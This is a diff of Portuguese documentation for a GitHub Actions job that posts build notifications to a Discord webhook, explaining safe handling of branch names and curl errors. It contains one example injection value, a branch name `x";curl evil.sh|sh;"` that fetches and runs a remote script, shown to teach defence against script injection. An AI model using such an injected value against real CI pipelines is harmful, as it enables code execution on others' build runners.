@@ -626,7 +626,7 @@ revisores em uma tarde.
 > Este job **não** pode ser marcado como required status check. Ele não roda em
 > pull request, e um check que nunca reporta deixa o merge bloqueado para sempre.
 
-#### `jobs.notify` — dois steps, duas armadilhas
+#### `jobs.notify` — dois steps, três armadilhas
 
 O primeiro step decide a mensagem; o segundo envia.
 
@@ -655,16 +655,27 @@ pipeline vermelho.
         if: env.WEBHOOK_URL != ''
         env:
           WEBHOOK_URL: ${{ secrets.NOTIFY_WEBHOOK_URL }}
-          BRANCH: ${{ github.ref_name }}
+          BRANCH: ${{ github.head_ref || github.ref_name }}
         run: |
-          jq -n --arg branch "${BRANCH}" '…' | curl -sS -d @- "$WEBHOOK_URL"
+          jq -n --arg branch "${BRANCH}" '…' \
+          | curl -sS --fail-with-body -d @- "$WEBHOOK_URL"
 ```
 
 **Todo valor entra por `env:`, e o shell lê como `$VAR`.** Escrever
-`${{ github.ref_name }}` direto dentro do `run:` colaria o valor no **texto do
+`${{ github.head_ref }}` direto dentro do `run:` colaria o valor no **texto do
 script** antes do shell existir — uma branch chamada `x";curl evil.sh|sh;"`
 viraria código executável. É a injeção de script clássica do Actions. Por `env:`
 o valor é apenas dado.
+
+**`head_ref` e não `ref_name`.** Num `pull_request`, o `github.ref_name` devolve
+`2/merge` — a ref interna que o GitHub cria para testar o merge, que não é nome
+de branch nenhum. O `github.head_ref` carrega a branch de origem de verdade, e
+fica vazio fora de pull request; daí o `||`, que cai no `ref_name` em push e em
+tag.
+
+**`--fail-with-body` no `curl`.** Sem ele o `curl` sai com código 0 mesmo quando
+o Discord recusa o payload: o job fica verde e a mensagem nunca chega. Com ele o
+step fica vermelho e o log mostra o motivo que o Discord devolveu.
 
 **`jq` monta o JSON**, em vez de concatenação de string: uma aspa ou um acento
 num nome de branch não conseguem produzir corpo malformado. O `jq` vem
